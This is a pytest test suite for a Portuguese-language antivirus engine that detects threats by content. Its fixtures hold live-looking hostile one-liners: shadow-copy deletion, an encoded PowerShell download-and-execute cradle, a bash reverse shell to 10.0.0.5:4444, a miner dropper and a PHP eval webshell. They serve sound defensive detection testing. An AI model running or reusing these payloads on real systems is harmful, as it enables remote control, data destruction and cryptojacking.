"""Testes do motor de detecção (por conteúdo, nunca pelo nome)."""
import glob
import os
import sys

import pytest

import samples
from exeav.engine import filetype
from exeav.engine.models import CLEAN, MALICIOUS, SUSPICIOUS


def ids(res):
    return {i.id for i in res.indicators}


def test_eicar_detected_regardless_of_name(engine, tmp_path):
    for name in ("eicar.com", "foto_ferias.jpg", "README", "documento.pdf"):
        p = tmp_path / name
        p.write_bytes(samples.eicar())
        r = engine.scan_file(str(p)).result
        assert r.verdict == MALICIOUS and r.threat_name == "EICAR-Test-File", name


def test_name_does_not_matter(engine, tmp_path):
    """O mesmo conteúdo malicioso tem o mesmo veredito com qualquer nome/extensão."""
    data = b"@echo off\r\nvssadmin delete shadows /all /quiet\r\nbcdedit /set {default} recoveryenabled no\r\n"
    verdicts = set()
    for name in ("limpeza.bat", "foto.png", "virus.exe", "sem_extensao"):
        p = tmp_path / name
        p.write_bytes(data)
        r = engine.scan_file(str(p)).result
        verdicts.add((r.verdict, r.score))
    assert len(verdicts) == 1 and next(iter(verdicts))[0] == MALICIOUS
    # e um nome assustador com conteúdo inofensivo continua limpo
    p = tmp_path / "trojan_virus_ransomware_hack.exe"
    p.write_bytes(b"apenas um texto normal sem nada perigoso\n")
    assert engine.scan_file(str(p)).result.verdict == CLEAN


def test_benign_pe_clean(engine):
    r = engine.analyze(samples.benign_pe()).result
    assert r.file_type == "pe"
    assert r.verdict == CLEAN, r.reasons()


def test_injector_ransomware_pe(engine):
    r = engine.analyze(samples.injector_ransom_pe()).result
    assert r.verdict == MALICIOUS
    assert {"pe.api_injection", "ransom.shadow_delete", "pe.sedebug", "pe.av_killer"} <= ids(r)


def test_keylogger_pe(engine):
    r = engine.analyze(samples.keylogger_pe()).result
    assert r.verdict == MALICIOUS
    assert {"pe.api_keylogger", "spy.keylog_strings", "exfil.webhook", "pe.api_downloader"} <= ids(r)


def test_packed_only_is_not_condemned(engine):
    """Um programa apenas empacotado não deve ser tratado como vírus (teto para indicadores estruturais)."""
    r = engine.analyze(samples.packed_pe()).result
    assert "pe.packer" in ids(r) or "pe.wx_section" in ids(r)
    assert r.verdict != MALICIOUS


def test_powershell_encoded_is_decoded(engine):
    import base64
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.1/x')".encode("utf-16le")
    data = b"powershell.exe -NoP -W Hidden -Enc " + base64.b64encode(inner)
    an = engine.analyze(data)
    assert an.result.verdict == MALICIOUS
    assert "ps.download_exec" in ids(an.result)
    assert any("DownloadString" in d for d in an.decoded)


def test_base64_embedded_exe_in_script(engine):
    import base64
    pe = samples.injector_ransom_pe()
    data = b"$b = [Convert]::FromBase64String('" + base64.b64encode(pe) + b"')\n[IO.File]::WriteAllBytes('x.exe', $b)\n"
    r = engine.analyze(data).result
    assert "deobf.payload" in ids(r)
    assert r.verdict == MALICIOUS


def test_linux_scripts(engine):
    r = engine.analyze(b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n").result
    assert r.verdict == MALICIOUS and "nix.reverse_shell" in ids(r)
    r = engine.analyze(b"#!/bin/sh\nwget http://x/m -O /tmp/kd; chmod +x /tmp/kd; /tmp/kd --donate-level 1 "
                       b"-o stratum+tcp://pool.example:3333\n").result
    assert r.verdict == MALICIOUS and {"nix.dropper_tmp", "miner.stratum"} <= ids(r)


def test_php_webshell(engine):
    r = engine.analyze(b"<?php @eval(base64_decode($_POST['cmd'])); ?>").result
    assert r.verdict == MALICIOUS and "php.webshell" in ids(r)


def test_office_macro(engine):
    an = engine.analyze(samples.macro_docm())
    assert an.result.file_type == "ooxml"
    assert "AutoOpen" in an.macro
    assert {"macro.autoexec", "macro.exec"} <= ids(an.result)
    assert an.result.verdict == MALICIOUS


def test_follina(engine):
    r = engine.analyze(samples.follina_docx()).result
    assert r.verdict == MALICIOUS and "ooxml.follina" in ids(r)


def test_pdf_js_launch(engine):
    r = engine.analyze(samples.malicious_pdf()).result
    assert {"pdf.auto_js", "pdf.launch"} <= ids(r)
    assert r.verdict in (SUSPICIOUS, MALICIOUS)


def test_threat_inside_zip(engine):
    r = engine.analyze(samples.zip_with("fatura.txt", samples.eicar())).result
    assert r.verdict == MALICIOUS
    assert any(i.id.startswith("arch.member") for i in r.indicators)


def test_exe_hidden_in_image(engine):
    png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 100 + samples.benign_pe()
    r = engine.analyze(png).result
    assert "gen.embedded_pe" in ids(r)


def test_clean_text_and_media(engine):
    for data in (b"Ola, este e um documento comum.\n" * 50, b"\x89PNG\r\n\x1a\n" + bytes(range(256)) * 10,
                 b"\xff\xd8\xff\xe0" + b"\x11" * 5000):
        assert engine.analyze(data).result.verdict == CLEAN


def test_filetype_by_content():
    assert filetype.detect(samples.benign_pe()) == "pe"
    assert filetype.detect(b"\x7fELF\x02\x01\x01" + b"\x00" * 60) in ("elf", "elf-so")
    assert filetype.detect(b"%PDF-1.4\n") == "pdf"
    assert filetype.detect(b"#!/bin/sh\necho hi\n") == "script"


def test_self_exclusion(engine):
    """O antivírus nunca analisa a si mesmo."""
    import exeav
    r = engine.scan_file(exeav.__file__).result
    assert r.skipped and "próprio antivírus" in r.error
    r = engine.scan_file(sys.executable).result
    assert r.skipped


def test_rules_bin_in_sync():
    """O arquivo ofuscado distribuído corresponde à fonte legível."""
    from exeav.engine.rules import RULES_BIN, decode_rules
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "rules"))
    import rules_src
    assert decode_rules(RULES_BIN.read_bytes()) == list(rules_src.RULES)


def test_rules_bin_has_no_plaintext_patterns():
    from exeav.engine.rules import RULES_BIN
    raw = RULES_BIN.read_bytes().lower()
    for word in (b"vssadmin", b"mimikatz", b"eicar", b"amsiutils", b"stratum"):
        assert word not in raw


@pytest.mark.skipif(not os.path.isdir("/usr/bin"), reason="somente Linux")
def test_no_false_positives_on_system_binaries(engine):
    files = [p for p in sorted(glob.glob("/usr/bin/*"))[:400] if os.path.isfile(p) and not os.path.islink(p)]
    bad = []
    for p in files:
        r = engine.scan_file(p).result
        if r.verdict != CLEAN:
            bad.append((p, r.verdict, r.reasons()))
    assert not bad, bad


@pytest.mark.skipif(not sys.platform.startswith("win"), reason="somente Windows")
def test_no_false_positives_on_windows_system(engine):
    sysdir = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32")
    files = [p for p in sorted(glob.glob(os.path.join(sysdir, "*.exe")))[:300]]
    files += [p for p in sorted(glob.glob(os.path.join(sysdir, "*.dll")))[:300]]
    bad = []
    for p in files:
        try:
            r = engine.scan_file(p).result
        except Exception:
            continue
        if r.verdict == MALICIOUS:
            bad.append((p, r.reasons()))
    assert not bad, bad


@pytest.mark.skipif(not sys.platform.startswith("win"), reason="somente Windows")
def test_windows_signature_trust():
    from exeav.engine import trust
    ok, desc = trust.check(os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "notepad.exe"))
    assert ok, desc
